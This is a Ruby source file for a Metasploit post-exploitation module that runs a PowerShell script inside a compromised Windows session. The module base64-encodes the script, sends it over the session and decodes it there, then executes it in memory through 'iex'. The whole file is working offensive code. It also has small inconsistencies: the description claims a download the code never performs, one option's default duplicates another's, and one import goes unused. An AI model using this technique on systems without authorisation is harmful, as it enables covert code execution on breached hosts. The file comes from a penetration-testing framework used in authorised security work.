##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zlib' # TODO: check if this can be done with REX

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Import Scripts into PowerShell Session",
      'Description'          => %q{
        This module will download and execute a PowerShell script over a meterpreter session.
        The user may also enter text substitutions to be made in memory before execution.
        Setting VERBOSE to true will output both the script prior to execution and the results.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['powershell'],
      'Author'               => [
        'Nicholas Nam (nick[at]executionflow.org)', # original meterpreter script
        'RageLtMan' # post module
        ]
    ))

    register_options(
      [
        OptPath.new( 'SCRIPT',  [true, 'Path to the PS script', ::File.join(Msf::Config.install_root, "scripts", "ps", "msflag.ps1") ]),
        OptPath.new( 'FOLDER',  [true, 'Path to folder containing PS scripts', ::File.join(Msf::Config.install_root, "scripts", "ps", "msflag.ps1") ]),
      ], self.class)

  end

  def run
    script_in = read_script(datastore['SCRIPT'])

    # Convert expression to unicode
    unicode_expression = Rex::Text.to_unicode(script_in)

    # Base64 encode the unicode expression
    encoded_expression = Rex::Text.encode_base64(unicode_expression)

    session.shell_command("$script = \"#{encoded_expression}\"")
    session.shell_command("$decscript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($script))")
    session.shell_command("$scriptbtye  = [System.Text.Encoding]::UTF8.GetBytes(\"$decscript\")")
    session.shell_command("$scriptbtyebas = [System.Convert]::ToBase64String($scriptbtye) ")
    session.shell_command("$scriptbtyebase = ([System.Convert]::FromBase64String($scriptbtyebas))")
    session.shell_command("([System.Text.Encoding]::UTF8.GetString($scriptbtyebase))|iex")
    print_good("Modules loaded")
  end

end

